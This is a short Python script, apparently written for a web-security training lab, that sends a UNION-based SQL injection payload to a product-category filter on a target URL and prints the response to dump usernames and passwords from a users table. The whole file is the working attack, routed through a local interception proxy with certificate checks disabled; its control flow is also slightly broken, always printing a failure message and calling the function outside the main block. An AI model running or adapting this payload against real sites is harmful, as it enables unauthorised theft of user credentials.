# Retreiving data from the database  with 2 columns and can be done within 1 column by certain payload

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli():
    username = "administrator"
    path = "filter?category=Gifts"
    payload = "' UNION SELECT username, password FROM users--"
    r = requests.get(url + path + payload, verify=False, proxies=proxies)
    res = r.text
    print(res)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" %sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the list of usernames and passwords...")
    if not exploit_sqli():
        print("Did not find the admin password")

exploit_sqli()
